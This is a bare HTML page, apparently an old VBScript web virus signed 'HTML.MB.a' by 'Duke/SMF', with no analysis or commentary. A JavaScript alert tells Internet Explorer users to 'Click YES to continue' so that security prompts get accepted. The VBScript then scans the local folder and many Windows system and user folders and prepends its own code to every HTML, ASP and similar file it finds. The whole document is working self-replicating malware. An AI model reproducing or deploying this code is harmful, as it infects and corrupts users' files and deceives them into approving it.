<!-- HTML.MB.a -->
<html><body>
<SCRIPT Language = "JavaScript">
<!--
var userAgent=navigator.appName;
var userVer=navigator.appVersion;
var agentInfo=userAgent.substring(0, 1);
var agentVer=userVer.substring(0, 1);
if(agentInfo == "M"){
if  (agentVer =="4"){
alert("Click YES to continue...")
}
}else {
alert("This page designed ONLY for IE4 :(")
self.close()
}
//-->
</script>

<script Language="VBScript">
<!-- HTML.MB.a -->
<!-- by Duke/SMF -->
<!--
On Error Resume Next
If location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Path = Replace(location.href, "/", "\")
   Path = Replace(Path, "file:\\\", "")
   Path = FSO.GetParentFolderName(Path)
   Set TRange = document.body.createTextRange
   Call ScanDir(Path)
   Call CFolder("")
   Call CFolder("Temp")
   Call CFolder("My Documents")
   Call CFolder("Windows\Desktop")
   Call CFolder("Windows\Web")
   Call CFolder("Windows\Web\Wallpaper")
   Call CFolder("Windows\Help")
   Call CFolder("Windows\Temp")
   Call CFolder("Windows\ShellNew")
   Call CFolder("Windows\System")
   Call CFolder("Windows")
   Call CFolder("Winnt\Desktop")
   Call CFolder("Winnt\Web")
   Call CFolder("Winnt\Web\Wallpaper")
   Call CFolder("Winnt\Help")
   Call CFolder("Winnt\Temp")
   Call CFolder("Winnt\ShellNew")
   Call CFolder("Winnt\System")
   Call CFolder("Winnt")
   Call CFolder("Program Files\Internet Explorer")
End If

Sub CFolder(Dir)
Call ScanDir("C:\"+Dir)
End Sub

Sub ScanDir(Dir)
On Error Resume Next
if FSO.FolderExists(Dir) then
   Do
      Set FolderObj = FSO.GetFolder(Dir)
      Dir = FSO.GetParentFolderName(Dir)
      Set FO = FolderObj.Files
      For each target In FO
          ExtName = lcase(FSO.GetExtensionName(target.Name))
          if ExtName = "htm" or ExtName = "html" or ExtName = "asp" or ExtName = "shtml" or ExtName = "stm"  Then
              Set Real = FSO.OpenTextFile(target.path, 1, False)
              If Real.readline <> "<!-- HTML.MB.a -->" Then
                  Real.close()
                  InfectFile(target.path)
              Else
                  Real.close()
              End If
          End If
      Next
   Loop Until FolderObj.IsRootFolder = True
End If
End Sub

Sub InfectFile(FN)
    Set Real = FSO.OpenTextFile(FN, 1, False)
    FileContents = Real.ReadAll()
    Real.close()
    Set Real = FSO.OpenTextFile(FN, 2, False)
    Real.WriteLine "<!-- HTML.MB.a -->"
    Real.Write("<html><body>" + Chr(13) + Chr(10))
    Real.WriteLine TRange.htmlText
    Real.WriteLine("</body></html>")
    Real.Write(FileContents)
    Real.close()
End Sub

-->
</script>

